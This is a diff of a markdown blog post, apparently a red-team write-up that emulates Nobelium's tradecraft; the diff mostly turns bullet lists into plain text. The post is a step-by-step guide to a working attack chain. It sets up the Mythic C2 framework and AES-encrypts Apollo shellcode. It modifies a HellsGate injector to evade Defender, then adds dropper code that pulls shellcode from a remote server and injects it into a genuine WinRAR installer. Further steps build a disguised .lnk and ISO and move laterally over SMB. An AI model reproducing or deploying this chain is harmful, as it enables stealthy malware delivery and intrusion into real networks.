@@ -34,28 +34,28 @@ In this case we bypass defenses on the target that include Windows Defender and 
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817163642.png)
 
-- The attack chain is as follows:
+The attack chain is as follows:
 
-	- `.iso` --> `.lnk` --> `Dropper/Injector.exe` --> `LegitInstaller.exe`
+- `.iso` --> `.lnk` --> `Dropper/Injector.exe` --> `LegitInstaller.exe`
 
-- In this scenario, we assume that a malicious `.iso` file was downloaded from the internet / was download via `HTML Smuggling` techniques. Usually `.iso` files contain installers (Ex: Games). To emulate this I've used the simple `winrar` project. Once the `.iso` file is opened or mounted 3 files appear. 
+In this scenario, we assume that a malicious `.iso` file was downloaded from the internet / was download via `HTML Smuggling` techniques. Usually `.iso` files contain installers (Ex: Games). To emulate this I've used the simple `winrar` project. Once the `.iso` file is opened or mounted 3 files appear. 
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220824161512.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220824161512.png)
 
-- As the names suggest the user would misdirected to click on the malicious `.lnk` setup file which would inturn execute the `HellsGateDropper/Injector` (`winrar-x64-611-check.exe`). If examined, this would look like a normal check but in the background it downloads AES encrypted shellcode, decrypts it on the fly, spawns the legitimate `winrar-x64-611.exe` setup file and injects shellcode into the trusted installer. 
+As the names suggest the user would misdirected to click on the malicious `.lnk` setup file which would inturn execute the `HellsGateDropper/Injector` (`winrar-x64-611-check.exe`). If examined, this would look like a normal check but in the background it downloads AES encrypted shellcode, decrypts it on the fly, spawns the legitimate `winrar-x64-611.exe` setup file and injects shellcode into the trusted installer. 
 
-- From an user's standpoint after clicking on the `.lnk` setup the trusted installer is spawned, deeming the execution non malicious but in the background a lot more malicious events occur.
+From an user's standpoint after clicking on the `.lnk` setup the trusted installer is spawned, deeming the execution non malicious but in the background a lot more malicious events occur.
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032107.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032107.png)
 
-- Since the shellcode is injected into the trusted installer, it would live for as along as the process is terminated. It is recommended to chain this along with persistence techniques, but that is out of scope for this assignment.
+Since the shellcode is injected into the trusted installer, it would live for as along as the process is terminated. It is recommended to chain this along with persistence techniques, but that is out of scope for this assignment.
 
 <!-- TOC --><a name="setup-mythic"></a>
 ### Setup Mythic 
 
-- Refer Mythic documentation from: https://docs.mythic-c2.net/installation
+Refer Mythic documentation from: https://docs.mythic-c2.net/installation
 
-- Install Mythic on kali: 
+Install Mythic on kali: 
 
 ```
 kali> git clone https://github.com/its-a-feature/Mythic
@@ -63,7 +63,7 @@ kali> git clone https://github.com/its-a-feature/Mythic
 kali> ./install_docker_kali.sh
 ```
 
-- Install the `Apollo` agent (windows) along with `http`, `tcp`, `smb` c2 profiles from the appropriate github repos at:
+Install the `Apollo` agent (windows) along with `http`, `tcp`, `smb` c2 profiles from the appropriate github repos at:
 
 	- C2 profiles: https://github.com/MythicC2Profiles
 
@@ -73,7 +73,7 @@ kali> ./install_docker_kali.sh
 kali> sudo ./mythic-cli install github https://github.com/user/repo
 ```
 
-- Generate a self signed certificate and private key to use `https` egress.
+Generate a self signed certificate and private key to use `https` egress.
 
 ```
 kali> cd C2_Profiles/HTTP/c2_code
@@ -82,7 +82,7 @@ kali> cd C2_Profiles/HTTP/c2_code
 kali> openssl req -newkey rsa:4096  -x509  -sha512  -days 365 -nodes -out certificate.pem -keyout privatekey.pem
 ```
 
-- Edit `config.json` to have the `key_path` and `cert_path` variables be the name of the private key and cert you just generated and set `https` to `true`  
+Edit `config.json` to have the `key_path` and `cert_path` variables be the name of the private key and cert you just generated and set `https` to `true`  
 
 ```
 kali> cat config.json            
@@ -107,7 +107,7 @@ kali> cat config.json
 }
 ```
 
-- Gather `mythic_admin` creds from the `.env` file:
+Gather `mythic_admin` creds from the `.env` file:
 
 ```
 kali> cat .env
@@ -130,7 +130,7 @@ MYTHIC_ADMIN_USER="mythic_admin"
 [..................................]
 ```
 
-- Start the Mythic C2 and visit: https://127.0.0.1:7443 using a browser and login.
+Start the Mythic C2 and visit: https://127.0.0.1:7443 using a browser and login.
 
 ```
 kali> ./mythic-cli start 
@@ -139,52 +139,52 @@ kali> ./mythic-cli start
 <!-- TOC --><a name="generate-mythic-shellcode"></a>
 ### Generate Mythic shellcode
 
-- Go to the `Payloads` tab --> `Actions` drop down --> click `Generate New Payload`
+Go to the `Payloads` tab --> `Actions` drop down --> click `Generate New Payload`
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817164505.png)
 
-- Select Target Operating System as `Windows` and click `Next`:
+Select Target Operating System as `Windows` and click `Next`:
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817164648.png)
 
-- Select Output as `Shellcode`:
+Select Output as `Shellcode`:
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817164743.png)
 
-- Select only `load` (other commands can be loaded later using this if needed) `upload`, `exit`, `link` and `unlink` to keep the agent as small as possible and then click `Next`:
+Select only `load` (other commands can be loaded later using this if needed) `upload`, `exit`, `link` and `unlink` to keep the agent as small as possible and then click `Next`:
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817165222.png)
 
-- In C2 profiles select `http`: 
+In C2 profiles select `http`: 
 
-	- Set `Callback Host` to the IP address of the kali host: `https://192.168.73.134`
+- Set `Callback Host` to the IP address of the kali host: `https://192.168.73.134`
 
-	- Set `callback_interval` to `60` (long sleep times improve OPSEC)
+- Set `callback_interval` to `60` (long sleep times improve OPSEC)
 
-	- Change the `HTTP Headers` --> `User Agent`  to something new and plausible to `Windows 10`: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36`
+- Change the `HTTP Headers` --> `User Agent`  to something new and plausible to `Windows 10`: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36`
 
-	- Change the `Name of the query parameter for GET requests` to something custom like `winrarq` and the same with `POST request URI` to something like `winrardata` and click `Next`
+- Change the `Name of the query parameter for GET requests` to something custom like `winrarq` and the same with `POST request URI` to something like `winrardata` and click `Next`
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817170153.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817170153.png)
 
-- Name the payload and click `Create Payload`
+Name the payload and click `Create Payload`
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817170425.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817170425.png)
 
-- A payload should be generate in the `Payloads` tab. Download it and transfer it to a Windows machine.
+A payload should be generate in the `Payloads` tab. Download it and transfer it to a Windows machine.
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817170627.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817170627.png)
 
 <!-- TOC --><a name="aes-encrypt-the-apollo-shellcode"></a>
 ### AES Encrypt the Apollo Shellcode 
 
-- Encrypting shellcode helps evade analysis from web proxies and network analyzers. 
+Encrypting shellcode helps evade analysis from web proxies and network analyzers. 
 
-- [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) has a useful powershell called [Invoke-SharpEncrypt.ps1](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpEncrypt.ps1) which is useful to aes encrypt shellcode using a password.
+[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) has a useful powershell called [Invoke-SharpEncrypt.ps1](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpEncrypt.ps1) which is useful to aes encrypt shellcode using a password.
 
-- Parts of [Invoke-SharpLoader.ps1](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpLoader.ps1) have been incoporated in the Hells Gate project shown below to decrypt the aes shellcode.
+Parts of [Invoke-SharpLoader.ps1](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpLoader.ps1) have been incoporated in the Hells Gate project shown below to decrypt the aes shellcode.
 
-- Import [Invoke-SharpEncrypt.ps1](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpEncrypt.ps1)  and aes encrypt the shellcode:
+Import [Invoke-SharpEncrypt.ps1](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpEncrypt.ps1)  and aes encrypt the shellcode:
 
 ```
 PS D:\Interview\Invoke-SharpLoader> . .\Invoke-SharpEncrypt.ps1
@@ -217,61 +217,61 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Since the task was to bypass defender, it would be really simple to create a script to disable defender and have code execution after but in my experience I find that not OPSEC safe and very loud. Hence it would be really nice to have code execution without any alerts or footprints hence I chose the `HellsGate VX` technique to evade most EDR's/AV's.
 
-- `HellsGate VX`  takes a more archaic approach - rather invoking system calls; the VX relies on well-established methodologies, the run-time reproduction of `LoadLibrary`, `GetProcAddress`, and `FreeLibrary`. This method has been sufficient in nullifying the PE files `Import Address Table` (IAT) as well as evading rudimentary heuristic analysis. In short this techique pseudo-disassembling `NTDLL` to retrieve the appropriate syscalls. 
+`HellsGate VX`  takes a more archaic approach - rather invoking system calls; the VX relies on well-established methodologies, the run-time reproduction of `LoadLibrary`, `GetProcAddress`, and `FreeLibrary`. This method has been sufficient in nullifying the PE files `Import Address Table` (IAT) as well as evading rudimentary heuristic analysis. In short this techique pseudo-disassembling `NTDLL` to retrieve the appropriate syscalls. 
 
-- An advantage this technique has over well defined syscall techniques like `SysWhispers` is that `SysWhispers` relies solely on statically defined syscall numbers and techniques like `HellsGate VX` self-resolves syscalls without the need of static elements.
+An advantage this technique has over well defined syscall techniques like `SysWhispers` is that `SysWhispers` relies solely on statically defined syscall numbers and techniques like `HellsGate VX` self-resolves syscalls without the need of static elements.
 
 <!-- TOC --><a name="improving-evasion"></a>
 #### Improving Evasion
 
 This C# implementation of `HellsGate`  is used as a base template: https://github.com/sbasu7241/HellsGate
 
-- Compiling from source using `Visual Studio 2019` without changing anything we have 20 detections:
+Compiling from source using `Visual Studio 2019` without changing anything we have 20 detections:
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817201913.png)
 
-- Analyzing with a decompiler: `ILSpy`
+Analyzing with a decompiler: `ILSpy`
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817202621.png)
 
-- It most likely looks like the detections arise from:
+It most likely looks like the detections arise from:
 
-	- Function, namespace, variable names.
+- Function, namespace, variable names.
 
-	- Comments for verbosity
+- Comments for verbosity
 
-	- Shellcode (MSF generated shellcode) is a heavy indicator
+- Shellcode (MSF generated shellcode) is a heavy indicator
 
-- Change the above manually
+Change the above manually
 
-	- In Visual Studio, use `CTRL` + `SHFT` + `H` to `search and replace` in all files: replace words like `HellsGate` to `HellG`
+- In Visual Studio, use `CTRL` + `SHFT` + `H` to `search and replace` in all files: replace words like `HellsGate` to `HellG`
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817203025.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817203025.png)
 
-	- Rewrite comments for verbosity (`Console.WriteLine()` statements) to break any signatures from them as follows:
+- Rewrite comments for verbosity (`Console.WriteLine()` statements) to break any signatures from them as follows:
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817203258.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817203258.png)
 
-	- Replace the shellcode to a something non malicious like a nullbyte to test if the detection was from the shellcode:
+Replace the shellcode to a something non malicious like a nullbyte to test if the detection was from the shellcode:
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817203426.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817203426.png)
 
-- Rebuild the project and upload it on Virus Total: We see that it bypass's Microsoft defender/ATP and has lessened detections to 8.
+Rebuild the project and upload it on Virus Total: We see that it bypass's Microsoft defender/ATP and has lessened detections to 8.
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817203731.png)
 
-- Rewriting and adding more functionality to the code should improve the detections a bit.
+Rewriting and adding more functionality to the code should improve the detections a bit.
 
 <!-- TOC --><a name="incoporating-the-shellcode-decryptor-and-dropper"></a>
 #### Incoporating the Shellcode Decryptor and Dropper
 
-- Here we add code sections to download and decrypt the encrypted shellcode from a hosted webserver (dropper) along with that parts to spawn the legitimate `winrar` executable and inject shellcode into it.
+Here we add code sections to download and decrypt the encrypted shellcode from a hosted webserver (dropper) along with that parts to spawn the legitimate `winrar` executable and inject shellcode into it.
 
-- The idea basically is that when say the malicious `.lnk` is executed, this program would be executed and would download the encrypted shellcode, decyrpt it in memory and next spawn the legitimate `winrar` installer and inject the decrypted shellcode in it. Basically the `.lnk` execution would seem legitimate as it ultimately spawns the `winrar` installer but is abused to inject shellcode in this legitimate installer.
+The idea basically is that when say the malicious `.lnk` is executed, this program would be executed and would download the encrypted shellcode, decyrpt it in memory and next spawn the legitimate `winrar` installer and inject the decrypted shellcode in it. Basically the `.lnk` execution would seem legitimate as it ultimately spawns the `winrar` installer but is abused to inject shellcode in this legitimate installer.
 
-- We add hardcoded values to do away with arguments during execution.
+We add hardcoded values to do away with arguments during execution.
 
-- Add these function protoype's before the `main()` function to add functions to decrypt the shellcode: ([Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) provides good insight for this)
+Add these function protoype's before the `main()` function to add functions to decrypt the shellcode: ([Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) provides good insight for this)
 
 ```
 // AES Decrypt Shellcode Prototype Definitions
@@ -363,7 +363,7 @@ public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes
 }
 ```
 
-- Remove the following lines in `main()`:
+Remove the following lines in `main()`:
 
 ```
 byte[] shellcode = new byte[] {0x00};
@@ -374,7 +374,7 @@ IntPtr alloc_size = new IntPtr(Convert.ToUInt32(shellcode.Length));
 int processid = int.Parse(args[0]);
 ```
 
-- Replace it with the following to add dropper functionality i.e to download, decrypt the shellcode and to spawn the `winrar` installer and inject it into its memory.
+Replace it with the following to add dropper functionality i.e to download, decrypt the shellcode and to spawn the `winrar` installer and inject it into its memory.
 
 ```
 string location = "http://192.168.0.115/winrar.enc";
@@ -435,32 +435,32 @@ Console.WriteLine("ID: " + procId);
 int processid = procId;
 ```
 
-- Rebuild the project and upload the binary to VirusTotal: We now have only 5 detections:
+Rebuild the project and upload the binary to VirusTotal: We now have only 5 detections:
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817210442.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817210442.png)
 
-- Download a `winrar` setup file from: https://www.win-rar.com/download.html?&L=0 and place it in the same folder. 
+Download a `winrar` setup file from: https://www.win-rar.com/download.html?&L=0 and place it in the same folder. 
 
-- Recompile the `HellsGate.exe` executable this time with an icon in Visual Studio: Right click `HellsGate` in the `Solution Explorer` and click `Properties`
+Recompile the `HellsGate.exe` executable this time with an icon in Visual Studio: Right click `HellsGate` in the `Solution Explorer` and click `Properties`
 
-	- Download a `winrar` icon from: http://www.rw-designer.com/icon-detail/21764
+- Download a `winrar` icon from: http://www.rw-designer.com/icon-detail/21764
 
-	- Under the `Application` tab add an Icon via browsing to the download icon.
+- Under the `Application` tab add an Icon via browsing to the download icon.
 
-	- Rename the `HellsGate.exe` file to `winrar-x64-611-check.exe`:
+- Rename the `HellsGate.exe` file to `winrar-x64-611-check.exe`:
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817230834.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817230834.png)
 
-- Change executable permissions for  `winrar-x64-611-check`: Right click over the executable and select `Properties`
+Change executable permissions for  `winrar-x64-611-check`: Right click over the executable and select `Properties`
 
-	- Enable `Run as Admin`:
+- Enable `Run as Admin`:
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817231040.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220817231040.png)
 
 <!-- TOC --><a name="create-the-malicious-lnk"></a>
 ### Create the malicious .lnk
 
-- Create a shortcut file with the same icon as before and this `.lnk` executes `winrar-x64-611-check.exe` (`HellsGateInjector/Dropper`) to remotely download and inject shellcode into  `winrar-x64-611.exe` (the legitimate installer).
+Create a shortcut file with the same icon as before and this `.lnk` executes `winrar-x64-611-check.exe` (`HellsGateInjector/Dropper`) to remotely download and inject shellcode into  `winrar-x64-611.exe` (the legitimate installer).
 
 ```
 $obj = New-object -comobject wscript.shell
@@ -472,7 +472,7 @@ $link.arguments = "/c winrar-x64-611-check.exe"
 $link.save()
 ```
 
-- An alternate way of execution derived from the `Nobelium` attack is:
+An alternate way of execution derived from the `Nobelium` attack is:
 
 ```
 $link.targetpath = "C:\Windows\System32\rundll32.exe"
@@ -482,39 +482,39 @@ $link.arguments = "advpack.dll,RegisterOCX winrar-x64-611-check.exe"
 <!-- TOC --><a name="create-an-iso"></a>
 ### Create an ISO
 
-- Download and install `AnyBurn` from: http://www.anyburn.com/thank-you-install-anyburn.htm
+Download and install `AnyBurn` from: http://www.anyburn.com/thank-you-install-anyburn.htm
 
-- Say if the executable's in use were marked by the `MOTW flag` a suitable circumvent to remove this would be to use this project: https://github.com/mgeeky/PackMyPayload
+Say if the executable's in use were marked by the `MOTW flag` a suitable circumvent to remove this would be to use this project: https://github.com/mgeeky/PackMyPayload
 
-- Select `Create image file from files/folders`
+Select `Create image file from files/folders`
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818013000.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818013000.png)
 
-- Browse and add the folder including all 3 payload files.
+Browse and add the folder including all 3 payload files.
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818013118.png)
 
-- Next click `Create Now` with a suitable name.
+Next click `Create Now` with a suitable name.
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818013212.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818013212.png)
 
 <!-- TOC --><a name="payload-emulation"></a>
 ### Payload Emulation
 
-- Setup a webserver to server using wsl/linux to serve the encrypted shellcode (`winrar.enc`)
+Setup a webserver to server using wsl/linux to serve the encrypted shellcode (`winrar.enc`)
 
 ```
 root@GHOUL:/mnt/d/Interview/Invoke-SharpLoader# sudo python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-- We are going to assume that the malicious iso was download from the internet / downloaded via `HTML Smuggling` techniques.
+We are going to assume that the malicious iso was download from the internet / downloaded via `HTML Smuggling` techniques.
 
-- Mount / Execute the iso:
+Mount / Execute the iso:
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818015104.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818015104.png)
 
-- Execute the benign `winrar-x64-611-setup` file
+Execute the benign `winrar-x64-611-setup` file
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818015326.png)
 
@@ -523,19 +523,19 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 <!-- TOC --><a name="lateral-movement"></a>
 ### Lateral Movement
 
-- Generate Apollo shellcode same way as before but this time for the `SMB` profile:
+Generate Apollo shellcode same way as before but this time for the `SMB` profile:
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818025010.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818025010.png)
 
-- Say that we compromise credentials for another server from this host: Load the `make_token` and `link` modules: `load <command name>`
+Say that we compromise credentials for another server from this host: Load the `make_token` and `link` modules: `load <command name>`
 
-- Create a new Credential using `make_token`
+Create a new Credential using `make_token`
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818025532.png)
 
-- Reiterate the process to now encrypt the `SMB` shellcode and upload it on the `ADMIN$` share from Mythic using: `upload \\PACES-DC\C$\users\public\ winrar-x64-611.zip`
+Reiterate the process to now encrypt the `SMB` shellcode and upload it on the `ADMIN$` share from Mythic using: `upload \\PACES-DC\C$\users\public\ winrar-x64-611.zip`
 
-- RDP into `PACES-DC`, expand the Archive and execute the malicious `.lnk` like before:
+RDP into `PACES-DC`, expand the Archive and execute the malicious `.lnk` like before:
 
 ```
 PS> Expand-Archive winrar-x64-611.zip
@@ -543,7 +543,7 @@ PS> Expand-Archive winrar-x64-611.zip
 PS> .\winrar-x64-611-setup.lnk
 ```
 
-- Use Mythic to create a `link` to the SMB beacon on `PACES-DC`: `link PACES-DC`
+Use Mythic to create a `link` to the SMB beacon on `PACES-DC`: `link PACES-DC`
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818031735.png)
 
@@ -552,19 +552,19 @@ PS> .\winrar-x64-611-setup.lnk
 
 Analysing using `Process Hacker 2`:
 
-- A single `winrar` process exist inside which the shellcode is injected:
+A single `winrar` process exist inside which the shellcode is injected:
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032107.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032107.png)
 
-- Analysing memory there are no regions with `Execute` permissions:
+Analysing memory there are no regions with `Execute` permissions:
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032212.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032212.png)
 
-- Non existent parent process exists
+Non existent parent process exists
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032417.png)
 
-- Analyzing modules we see that `amsi.dll` is loaded in the current process:
+Analyzing modules we see that `amsi.dll` is loaded in the current process:
 
-	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032319.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/APT-Emulation-Nobellium/Pasted%20image%2020220818032319.png)
 
